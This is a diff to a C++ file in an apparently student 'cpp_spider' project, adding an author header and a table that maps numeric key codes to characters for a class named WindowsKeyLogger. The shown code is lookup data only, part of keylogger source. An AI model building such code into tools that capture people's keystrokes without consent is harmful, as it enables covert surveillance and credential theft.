@@ -1,3 +1,12 @@
+//
+// KeyboardMap.cpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/sources
+//
+// Made by Jeremy Thoveron
+// Login   <jeremy.thoveron-@epitech.net>
+//
+// Started on  Fri Sep 29 16:20:42 2017 Jeremy Thoveron
+// Last update Fri Sep 29 16:20:55 2017 Jeremy Thoveron
+//
 #include	"KeyLogger.hpp"
 
 std::map<DWORD, std::string> const WindowsKeyLogger::keys = {
@@ -143,3 +152,27 @@ std::map<DWORD, std::string> const WindowsKeyLogger::keys = {
   { VK_VOLUME_MUTE, "Volume Mute" },
   { VK_VOLUME_UP, "Volume Up" }
 };
+
+std::map<int, std::string> const WindowsKeyLogger::correlingTable =
+  {
+    {38, "1"},
+    {130, "2"},
+    {34, "3"},
+    {39, "4"},
+    {40, "5"},
+    {45, "6"},
+    {139, "7"},
+    {95, "8"},
+    {135, "9"},
+    {133, "0"},
+    {41, "°"},
+    {61, "+"},
+    {94, "¨"},
+    {36, "£"},
+    {151, "%"},
+    {42, "µ"},
+    {44, "?"},
+    {59, "."},
+    {58, "/"},
+    {33, "§"}
+  };
